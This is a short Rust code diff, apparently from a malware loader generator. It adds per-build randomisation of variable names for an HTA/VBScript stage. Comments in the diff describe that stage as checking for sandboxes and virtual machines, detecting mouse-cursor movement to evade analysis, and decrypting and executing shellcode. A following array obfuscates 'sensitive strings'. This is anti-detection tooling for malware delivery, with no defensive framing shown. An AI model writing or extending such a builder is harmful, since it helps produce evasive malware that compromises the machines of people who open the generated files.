@@ -276,6 +276,27 @@ fn build_context(config: &LoaderConfig) -> Context {
     ] {
         vars.insert(k, rand_ident(7));
     }
+    // HTA (VBScript) local variable names — randomised per build
+    for k in &[
+        // fn_sandbox vars
+        "hta_lv_sh", "hta_lv_vmr", "hta_lv_vbr", "hta_lv_vmi",
+        "hta_lv_fso", "hta_lv_drv",
+        "hta_lv_wmi", "hta_lv_procs", "hta_lv_badlist", "hta_lv_p", "hta_lv_pn", "hta_lv_jcnt",
+        "hta_lv_wmiprt", "hta_lv_printers", "hta_lv_prtcnt", "hta_lv_oprt",
+        "hta_lv_wmina", "hta_lv_naq", "hta_lv_nacnt", "hta_lv_ona",
+        "hta_lv_venv",
+        // sub_run vars: cursor check
+        "hta_lv_cx", "hta_lv_cy", "hta_lv_gotcur",
+        "hta_lv_ca", "hta_lv_wf", "hta_lv_ct", "hta_lv_pp", "hta_lv_ps",
+        "hta_lv_ca2", "hta_lv_wf2", "hta_lv_ct2", "hta_lv_pp2", "hta_lv_ps2",
+        "hta_lv_cx2", "hta_lv_cy2", "hta_lv_t0",
+        // sub_run vars: decryption + exec
+        "hta_lv_schex", "hta_lv_keyhex", "hta_lv_k", "hta_lv_ki",
+        "hta_lv_sc", "hta_lv_lcnt",
+        "hta_lv_loader", "hta_lv_stubhex", "hta_lv_stubbytes", "hta_lv_asm", "hta_lv_t", "hta_lv_mi",
+    ] {
+        vars.insert(k, rand_ident(7));
+    }
 
     // JScript charcode arrays (comma-separated integers) for sensitive strings
     let jsc_pairs: &[(&str, &str)] = &[
